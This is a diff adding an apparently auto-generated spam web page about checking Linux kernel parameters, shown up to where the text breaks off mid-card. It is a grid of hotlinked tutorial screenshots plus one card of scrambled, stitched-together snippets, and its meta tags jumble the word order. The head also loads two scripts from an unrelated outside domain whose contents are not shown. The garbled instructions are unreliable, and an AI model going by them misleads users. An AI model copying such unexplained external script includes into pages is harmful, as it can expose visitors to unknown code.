@@ -1,0 +1,552 @@
+<!doctype html>
+<html lang="en-US">
+<head>
+<script type="text/javascript" src="https://grottepastenaecollepardo.org/ik.js"></script>
+<script type="text/javascript" src="https://grottepastenaecollepardo.org/rfr.js"></script>
+<!--ads/oto.txt-->
+<!--ads/terra.txt-->
+<meta name="msvalidate.01" content="DE407F87A97446F5DE4454148343DF05" />
+	<!-- Required meta tags -->
+	<meta charset="utf-8">
+  <title>How To Check Kernel Parameter In Linux  - Entryunderstanding23</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta property="og:title" content="Breathtaking Info About How To Check Kernel Parameter In Linux  - Entryunderstanding23" />
+  <meta name="description" content="Breathtaking Info About Check Linux  Parameter In To Kernel How How To Tune Kernel Parameter. - Entryunderstanding23"/>
+  <meta name="keyword" content="Breathtaking Info About Parameter  How Linux To In Check Kernel Open A Terminal And Use Nano Or Your Preferred Text Editor To Open The Following Configuration File With Root Privileges. - Entryunderstanding23"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta name="googlebot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <meta name="bingbot" content="index, follow, max-snippet:-1, max-image-preview:large, max-video-preview:-1" />
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Breathtaking Info About How To Check Kernel Parameter In Linux " />
+  <meta name="twitter:description" content="Breathtaking Info About Check Linux  Parameter In To Kernel How Grub_cmdline_linux=rd.lvm.lv=rhel/swap Crashkernel=auto Rd.lvm.lv=rhel/root Rhgb Quiet. - Entryunderstanding23" />
+	<!-- Bootstrap CSS -->
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/4.4.1/css/bootstrap.min.css" integrity="sha256-L/W5Wfqfa0sdBNIKN9cG6QA5F2qx4qICmU2VgLruv9Y=" crossorigin="anonymous" />
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/lightbox2/2.11.1/css/lightbox.min.css" integrity="sha256-tBxlolRHP9uMsEFKVk+hk//ekOlXOixLKvye5W2WR5c=" crossorigin="anonymous" />
+	<link href="https://fonts.googleapis.com/css?family=Raleway" rel="stylesheet">	
+	<style type="text/css">
+.meww h1{padding-top:30px;}.posts-gallery,.posts-image,.posts-picture{display:block}.posts-gallery img,.posts-image img{object-fit:cover;object-position:center}body,html{font-family:"Source Sans Pro",sans-serif;font-size:14px;font-weight:400;background:#FFFFFF}img{max-width:100%}.container{max-width:1024px}.navbar{margin-bottom:25px;border-bottom:1px solid #eee;background:#DC143C!important;-webkit-box-shadow:0 0 25px -8px rgba(0,0,0,.75);-moz-box-shadow:0 0 25px -8px rgba(0,0,0,.75);box-shadow:0 0 25px -8px rgba(0,0,0,.75)}.posts-image-content,.widget{-webkit-box-shadow:0 0 25px -8px rgba(0,0,0,.75);-moz-box-shadow:0 0 25px -8px rgba(0,0,0,.75)}.navbar .navbar-brand{margin:0 10px 0 0;font-size:17px;padding:0;line-height:24px}.navbar .navbar-sub{margin:0 20px 0 0;font-size:14px;padding:0;line-height:24px}.row.content,.row.footer,.row.header{widthx:auto;max-widthx:100%}.row.footer{padding:30px 0;background:0 0;border-color:#eee}.content .col-sm-12{padding:0}.content .col-md-9s{margin-right:-25px}.posts-image{width:50%;float:left}.posts-image-content{width:auto;margin:0 15px 35px 0;position:relative;background:#fff;border:1px solid #eee;box-shadow:0 0 25px -8px rgba(0,0,0,.75);-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px}.posts-image img{width:100%;height:250px;margin-bottom:5px;-webkit-transition:.6s opacity;transition:.6s opacity;-webkit-border-radius:5px 5px 0 0;-moz-border-radius:5px 5px 0 0;border-radius:5px 5px 0 0}.posts-single,.widget{border:1px solid #eee}.posts-image:hover img{opacity:.8}.posts-image:hovers h2{background:rgba(0,0,0,.7)}.posts-image h2{z-index:2;font-size:20px;padding:5px 10px;text-align:left;-webkit-transition:.6s opacity;transition:.6s background;padding-top:30px}.posts-picture,.posts-picture img{text-align:center}.posts-image h2 a{color:#111}.posts-image-single .posts-image-content,.posts-image-single:nth-child(5n) .posts-image-content{margin:0 15px 15px 0!important}.posts-images{clear:both}.widget{background:#fff;box-shadow:0 0 25px -8px rgba(0,0,0,.75);-webkit-border-radius:5px;-moz-border-radius:5px;border-radius:5px;margin-bottom:20px}.list-group{border:none}.list-group li{padding:0;border:none}.list-group li a{display:block;padding:8px}h3.widget-title{font-size:20px;padding:10px 10px 5px}a{color:#DC143C;text-decoration:none}.footer{margin-top:21px;padding-top:13px;border-top:1px solid #eee}.footer a{margin:0 15px}.navi{margin:13px 0}.navi a{margin:5px 2px;font-size:95%}.posts-single{background:#fff;padding:15px;-webkit-box-shadow:0 0 25px -8px rgba(0,0,0,.75);-moz-box-shadow:0 0 25px -8px rgba(0,0,0,.75);box-shadow:0 0 25px -8px rgba(0,0,0,.75);-webkit-border-radius:5px 5px 0 0;-moz-border-radius:5px 5px 0 0;border-radius:5px 5px 0 0}.posts-singles{border:1px solid #eee;background:#fff;margin-top:-10px;border-top:0;padding:0 15px 15px;-webkit-box-shadow:0 8px 31px -9px rgba(0,0,0,.75);-moz-box-shadow:0 8px 31px -9px rgba(0,0,0,.75);box-shadow:0 8px 31px -9px rgba(0,0,0,.75);-webkit-border-radius:0 0 5px 5px;-moz-border-radius:0 0 5px 5px;border-radius:0 0 5px 5px}.posts-gallery{width:20%;float:left}.posts-gallery-content{border:1px solid #fff;width:auto;max-width:100%}.posts-gallery img{width:100%;height:110px}@media    only screen and (min-width:0px) and (max-width:991px){.container{width:auto;max-width:100%}.navbar{padding:5px 0}.navbar .container{width:100%;margin:0 15px}}@media    only screen and (min-width:0px) and (max-width:767px){.content .col-md-3{padding:15px}}@media    only screen and (min-width:481px) and (max-width:640px){.posts-gallery{width:33.3%}}@media    only screen and (min-width:0px) and (max-width:480px){.posts-image{width:100%}.posts-image .posts-image-content{margin-right:0}.posts-gallery{width:50%}}
+	</style>
+	<script type="application/ld+json">
+{
+  "@context": "https://schema.org/", 
+  "@type": "Article", 
+  "author": {
+    "@type": "Person",
+    "name": "entryunderstanding23"
+  },
+  "headline": "How To Check Kernel Parameter In Linux",
+  "datePublished": "2023-04-19",
+  "image": "https://www.tecmint.com/wp-content/uploads/2016/04/Set-Modify-Linux-Kernel-Runtime-Parameters.png",
+  "publisher": {
+    "@type": "Organization",
+    "name": "Entryunderstanding23",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://via.placeholder.com/512.png?text=how+to+check+kernel+parameter+in+linux",
+      "width": 512,
+      "height": 512
+    }
+  }
+}
+</script>
+	<!-- Head tag Code --></head>
+<body>
+	<header class="bg-white fixed-top">			
+		<nav class="navbar navbar-light bg-white mb-0">
+			<div class="container justify-content-center justify-content-sm-between">	
+			  <a href="/" title="Entryunderstanding23" class="navbar-brand mb-1">Entryunderstanding23</a>
+			  			</div>			  
+		</nav>				
+	</header>
+	<main id="main" class="main">
+		<div class="container">  
+			<div class="row content">
+				<div class="col-md-12 my-2" align="center">
+					<div class="d-block p-4">
+	<center>
+		<!-- TOP BANNER ADS -->
+	</center>
+</div>				</div>
+				<div class="col-md-9">
+					<div class="col-sm-12 p-2">
+							<h1>Casual Info About How To Check Kernel Parameter In Linux</h1>
+
+	
+	<div class="navi text-center">
+					<p align="justify">Check os version in linux. Then, save the file and exit. Note that shmseg is hardcoded in the kernel, the default is much higher. <br>				
+			</p>
+		    <!--ads/responsive.txt-->
+								<a class="badge badge-primary" href="/how-to-repair-phone-screens.html">how to repair phone screens</a>
+											<a class="badge badge-danger" href="/how-to-sell-a-soulbound-item.html">how to sell a soulbound item</a>
+											<a class="badge badge-secondary" href="/how-to-start-dhcpd.html">how to start dhcpd</a>
+											<a class="badge badge-success" href="/how-to-start-x-in-freebsd.html">how to start x in freebsd</a>
+											<a class="badge badge-dark" href="/how-to-sell-a-short-sale.html">how to sell a short sale</a>
+											<a class="badge badge-dark" href="/how-to-sell-firearms.html">how to sell firearms</a>
+											<a class="badge badge-light" href="/how-to-reduce-my-body-fat.html">how to reduce my body fat</a>
+											<a class="badge badge-secondary" href="/how-to-restore-peachtree.html">how to restore peachtree</a>
+						</div>
+	<div class="d-block p-4">
+	<center>
+		<!-- IN ARTICLE ADS -->
+	</center>
+</div>					</div> 
+					<div class="col-sm-12">					
+						
+		
+	<div class="row">
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.cyberciti.biz/media/new/faq/2018/12/How-to-view-Linux-kernel-parameters-using-cmdline.png" data-lightbox="roadtrip" title="How To View Linux Kernel Parameters For Currently Booted System - Nixcraft ">
+											<img class="card-img v-image" src="https://www.cyberciti.biz/media/new/faq/2018/12/How-to-view-Linux-kernel-parameters-using-cmdline.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSHwQ7lutrmlXDAqdFX_J6cc2MQx4M43Ck8Mhl1YSbuHcfLVIyliqTNJUxP8QniZi5KVwc';" alt="How To View Linux Kernel Parameters For Currently Booted System - Nixcraft">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>How To View Linux Kernel Parameters For Currently Booted System - Nixcraft </h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.tecmint.com/wp-content/uploads/2016/04/Check-Linux-Kernel-Parameter.png" data-lightbox="roadtrip" title="How To Change Kernel Runtime Parameters In A Persistent And Non-persistent  Way">
+											<img class="card-img v-image" src="https://www.tecmint.com/wp-content/uploads/2016/04/Check-Linux-Kernel-Parameter.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSB7Ce4agxB3BfRSZFJQ6mfsAfKiaHZ2kFzXSCGq8I0VYm8VExbZIJKKFuCKESXSkUqZqc';" alt="How To Change Kernel Runtime Parameters In A Persistent And Non-Persistent  Way">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h6>How To Change Kernel Runtime Parameters In A Persistent And Non-persistent  Way</h6></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://linuxconfig.org/wp-content/uploads/2022/03/03-how-to-set-kernel-boot-parameters-on-linux.png" data-lightbox="roadtrip" title="How To Set Kernel Boot Parameters On Linux - Tutorials Learn  Configuration">
+											<img class="card-img v-image" src="https://linuxconfig.org/wp-content/uploads/2022/03/03-how-to-set-kernel-boot-parameters-on-linux.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR-YpD--vCkWYNf5i0KPyDULzIeA8ENRPUA59qnUJGhXvEUJGD6zUvQgw1uLC7GiJREGO0';" alt="How To Set Kernel Boot Parameters On Linux - Linux Tutorials - Learn Linux  Configuration">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>How To Set Kernel Boot Parameters On Linux - Tutorials Learn  Configuration</h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://phoenixnap.com/kb/wp-content/uploads/2021/04/uname-command-for-more-kernel-information.png" data-lightbox="roadtrip" title="How To Check Linux Kernel Version In Command Line (4 Easy Options) ">
+											<img class="card-img v-image" src="https://phoenixnap.com/kb/wp-content/uploads/2021/04/uname-command-for-more-kernel-information.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5LdBlD6g4PMJpb4cjEMKibbe2-fPno3PN7KNBBk3iMJ9bBrGcLWJGJDPRaV5uHo6bjGo';" alt="How To Check Linux Kernel Version In Command Line (4 Easy Options)">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>How To Check Linux Kernel Version In Command Line (4 Easy Options) </h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.tecmint.com/wp-content/uploads/2016/04/Set-Modify-Linux-Kernel-Runtime-Parameters.png" data-lightbox="roadtrip" title="How To Change Kernel Runtime Parameters In A Persistent And Non-persistent  Way">
+											<img class="card-img v-image" src="https://www.tecmint.com/wp-content/uploads/2016/04/Set-Modify-Linux-Kernel-Runtime-Parameters.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT3oHtzl_CZwcyjkm7gCH_P123mIweNNzsnImXuS8e5dAhYjOTT_1HjqiZa10sSGqGlq4I';" alt="How To Change Kernel Runtime Parameters In A Persistent And Non-Persistent  Way">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h5>How To Change Kernel Runtime Parameters In A Persistent And Non-persistent  Way</h5></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.tecmint.com/wp-content/uploads/2014/03/Kernel-Boot-Time-Parameters.png" data-lightbox="roadtrip" title="11 Linux Kernel Boot-time Parameters Explained ">
+											<img class="card-img v-image" src="https://www.tecmint.com/wp-content/uploads/2014/03/Kernel-Boot-Time-Parameters.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSYDLv3H1lQwhk1qyNWxcJ1iiGP99ztVBFe9KLcUxALsG1b46cNUBpLm-yusCaT_k2cEDs';" alt="11 Linux Kernel Boot-Time Parameters Explained">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>11 Linux Kernel Boot-time Parameters Explained </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+					<div class="col-12 mb-4">
+				<div class="card">
+										<img class="card-img-top v-cover" src="https://www.cyberciti.biz/media/new/faq/2009/07/Check-Linux-Kernel-Version-in-Command-Line.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSYDLv3H1lQwhk1qyNWxcJ1iiGP99ztVBFe9KLcUxALsG1b46cNUBpLm-yusCaT_k2cEDs';" alt="11 Linux Kernel Boot-Time Parameters Explained">
+															<figcaption align="center">Source From : <a href="https://bottomvirus.troft.works" title="Bottomvirus">Bottomvirus</a></figcaption>
+										<div class="card-body">
+						<h3 class="h5"><b>Cat /proc/sys/kernel/sem | awk &#039; {print.</b></h3>
+													<p class="p-2" align="justify">
+																	<strong>How to check kernel parameter in linux</strong>. 
+																									\\temp\\mycustomkernel # sets additional kernel parameters, in this case enabling older.
+																	To change the kernel parameter you can define it under configuration file /etc/sysctl.conf and it will be applied at the next reboot.
+																	You can check to see whether your linux distribution (shell).
+															</p>
+													<p class="p-2" align="justify">
+																									Querying a specific kernel parameter.
+																	How to tune kernel parameter.
+																	Open a terminal and use nano or your preferred text editor to open the following configuration file with root privileges.
+															</p>
+													<p class="p-2" align="justify">
+																									# sysctl kernel.shmmax kernel.shmmax =.
+																	Grub_cmdline_linux=rd.lvm.lv=rhel/swap crashkernel=auto rd.lvm.lv=rhel/root rhgb quiet.
+																	Login as root user and add the following entries to /etc/sysctl.conf file kernel.shmmax = total memory or it should be large.
+															</p>
+													<p class="p-2" align="justify">
+																									Depending on what version of the linux kernel you have and how you have built or installed it, you might get.
+																	Loadable modules, after being loaded into the running kernel, also reveal their.
+																	Open the terminal application (bash shell) for remote server login using the ssh:
+															</p>
+													<p class="p-2" align="justify">
+																									Loadable modules, after being loaded into the running kernel, also reveal their.
+																	Check linux kernel parameters set or modify linux kernel parameters.
+																	Run the cat command in /proc/sys to view file content.
+															</p>
+													<p class="p-2" align="justify">
+																									/proc/sys/ is a pseudo directory generated after the linux kernel is started.
+																	Type any one of the following command to find os name.
+																	Configuring linux kernel parameters for oracle.
+															</p>
+						            <!--ads/responsive.txt-->
+					</div> 
+				</div>
+			</div>
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://linuxconfig.org/wp-content/uploads/2022/03/02-how-to-set-kernel-boot-parameters-on-linux.png" data-lightbox="roadtrip" title="How To Set Kernel Boot Parameters On Linux - Tutorials Learn  Configuration">
+											<img class="card-img v-image" src="https://linuxconfig.org/wp-content/uploads/2022/03/02-how-to-set-kernel-boot-parameters-on-linux.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRrt0mkAXseUB1NhY5jWTDnsnrRNVxXKcW2Hqx8BlbBjjWGy5Jx-EKXXCu--FPiefc16j4';" alt="How To Set Kernel Boot Parameters On Linux - Linux Tutorials - Learn Linux  Configuration">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h6>How To Set Kernel Boot Parameters On Linux - Tutorials Learn  Configuration</h6></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://linuxconfig.org/wp-content/uploads/2021/03/00-how-to-read-and-change-the-value-of-kernel-parameters-using-sysctl.png" data-lightbox="roadtrip" title="How To Read And Change The Value Of Kernel Parameters Using Sysctl - Linux  Tutorials Learn Configuration">
+											<img class="card-img v-image" src="https://linuxconfig.org/wp-content/uploads/2021/03/00-how-to-read-and-change-the-value-of-kernel-parameters-using-sysctl.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTL-y4GpDNNT0Bl1fgB19KPIFVUtAkTrSZj4Tz1x6uSkfP7BDSFCngRU1c6oI3CLzFHohA';" alt="How To Read And Change The Value Of Kernel Parameters Using Sysctl - Linux  Tutorials - Learn Linux Configuration">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>How To Read And Change The Value Of Kernel Parameters Using Sysctl - Linux  Tutorials Learn Configuration</h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.cyberciti.biz/media/new/faq/2007/04/Find-Linux-Kernel-Version-Installed-On-My-System.png" data-lightbox="roadtrip" title="How To Find Which Linux Kernel Version Is Installed On My System - Nixcraft ">
+											<img class="card-img v-image" src="https://www.cyberciti.biz/media/new/faq/2007/04/Find-Linux-Kernel-Version-Installed-On-My-System.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQuMXEp23hz66ethMIylghhl7jhNk00aIvyJ04xON6iUOSRtIF_nDI2-VX7mG0dkhmhKV0';" alt="How To Find Which Linux Kernel Version Is Installed On My System - Nixcraft">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>How To Find Which Linux Kernel Version Is Installed On My System - Nixcraft </h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.tecmint.com/wp-content/uploads/2016/04/Understand-Linux-proc-Filesystem.png" data-lightbox="roadtrip" title="How To Change Kernel Runtime Parameters In A Persistent And Non-persistent  Way">
+											<img class="card-img v-image" src="https://www.tecmint.com/wp-content/uploads/2016/04/Understand-Linux-proc-Filesystem.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTdsP0JEZIGXwABl46gYRBNzh3AKzXZQd7i1wDxiyBebdN32GsLk0JHYShnvZCh0WdcKSQ';" alt="How To Change Kernel Runtime Parameters In A Persistent And Non-Persistent  Way">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h2>How To Change Kernel Runtime Parameters In A Persistent And Non-persistent  Way</h2></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.howtoforge.com/images/kernel_boot-parameter_edit/big/pic_3.jpg" data-lightbox="roadtrip" title="How To Edit Your Kernel Boot Parameters On Linux ">
+											<img class="card-img v-image" src="https://www.howtoforge.com/images/kernel_boot-parameter_edit/big/pic_3.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXsaowfr4Z72zaWJVaSvNPkXKOJ6kPtK8BA5ZNFXq9v8CyI0HVyNghfUP_-lgxS8nuE8A';" alt="How To Edit Your Kernel Boot Parameters On Linux">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>How To Edit Your Kernel Boot Parameters On Linux </h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://linuxconfig.org/wp-content/uploads/2022/03/04-how-to-set-kernel-boot-parameters-on-linux.png" data-lightbox="roadtrip" title="How To Set Kernel Boot Parameters On Linux - Tutorials Learn  Configuration">
+											<img class="card-img v-image" src="https://linuxconfig.org/wp-content/uploads/2022/03/04-how-to-set-kernel-boot-parameters-on-linux.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRJB3yiTtp1FrZCAZj23c9kJKl-JQ8Q3KrAnYS07b6v6_utAasvjrjFkttSgfmuM0egONE';" alt="How To Set Kernel Boot Parameters On Linux - Linux Tutorials - Learn Linux  Configuration">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>How To Set Kernel Boot Parameters On Linux - Tutorials Learn  Configuration</h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://wiki.mageia.org/mw-en/images/thumb/8/87/KO-grub2-boot2.png/650px-KO-grub2-boot2.png" data-lightbox="roadtrip" title="How To Set Up Kernel Options - Mageia Wiki ">
+											<img class="card-img v-image" src="https://wiki.mageia.org/mw-en/images/thumb/8/87/KO-grub2-boot2.png/650px-KO-grub2-boot2.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQnJjyVXP8YLdH8pdmMxBDEzoJBgpQ4hwriK07wyFzXkm9lw1ZAe36QA0Wl5GEtlIEtbBs';" alt="How To Set Up Kernel Options - Mageia Wiki">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h6>How To Set Up Kernel Options - Mageia Wiki </h6></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.cyberciti.biz/media/new/faq/2007/02/Sysctl-command-in-Linux-with-examples.png" data-lightbox="roadtrip" title="Linux Set Sysctl Variables Command - Nixcraft ">
+											<img class="card-img v-image" src="https://www.cyberciti.biz/media/new/faq/2007/02/Sysctl-command-in-Linux-with-examples.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRchSXiMV2ldyzYFBGO1cN1zbHuLpESknp84FPPgc5Bu-vGjgRKaX-ltlZeONJQR57CdfM';" alt="Linux Set Sysctl Variables Command - Nixcraft">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h5>Linux Set Sysctl Variables Command - Nixcraft </h5></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.cyberciti.biz/media/new/faq/2009/07/Check-Linux-Kernel-Version-in-Command-Line.png" data-lightbox="roadtrip" title="How To Find Linux Kernel Version Command - Nixcraft ">
+											<img class="card-img v-image" src="https://www.cyberciti.biz/media/new/faq/2009/07/Check-Linux-Kernel-Version-in-Command-Line.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTXgNe420fP2TAVXVwTFQCw6AuC9uY5kAhZoM78Ta85noL-0NV9XFxvDFMjjYnnqclugPs';" alt="How To Find Linux Kernel Version Command - Nixcraft">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h4>How To Find Linux Kernel Version Command - Nixcraft </h4></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://linuxhint.com/wp-content/uploads/2022/07/Screenshot-2022-07-19-112539.png" data-lightbox="roadtrip" title="Sysctl Linux Command ">
+											<img class="card-img v-image" src="https://linuxhint.com/wp-content/uploads/2022/07/Screenshot-2022-07-19-112539.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQ2kU0GvdNjFD184HlEmK0ghyq7qSG5QTxZaXhu2KG8JuvomyoL3WbsP3PCDOyVbcbIiv0';" alt="Sysctl Linux Command">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h3>Sysctl Linux Command </h3></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.tecmint.com/wp-content/uploads/2016/04/Block-Ping-Requests-in-Linux.png" data-lightbox="roadtrip" title="How To Change Kernel Runtime Parameters In A Persistent And Non-persistent  Way">
+											<img class="card-img v-image" src="https://www.tecmint.com/wp-content/uploads/2016/04/Block-Ping-Requests-in-Linux.png" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTioSqmf14pJrDVLzQ58TUtsfowN4zyYJDUJ5wy9_U0-dimyTzYcbj4jVc_edePivx3YaU';" alt="How To Change Kernel Runtime Parameters In A Persistent And Non-Persistent  Way">
+										
+				</a>
+				<div class="card-body text-center">      
+					          <style>.kepala h1,.kepala h2,.kepala h3,.kepala h4,.kepala h5,.kepala h6,.kepala{font-size:16px;font-family:'Lora',serif;font-weight:400;text-align:center;font-style:italic;}</style>	
+					<div class="kepala"><h6>How To Change Kernel Runtime Parameters In A Persistent And Non-persistent  Way</h6></div>
+				</div>
+			</div>
+		</div>
+			 
+		 
+
+				
+		<div class="col-md-4 mb-4">
+			<div class="card h-100">
+				<a href="https://www.xmodulo.com/img/89.jpg" data-lightbox="roadtrip" title="How To Add Kernel Boot Parameters Via Grub On Linux ">
+											<img class="card-img v-image" src="https://www.xmodulo.com/img/89.jpg" onerror="this.onerror=null;this.src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRddug_4aWLZB5Ql1ehayOzWfvfjbAuwDk5Wj9bxFTZLkUDPnfsC4aDYdJHAqKmlr2SgMY';" alt="How To Add Kernel Boot Parameters Via Grub On Linux">
+										
+				</a>
+				<div class="card-body text-center">      
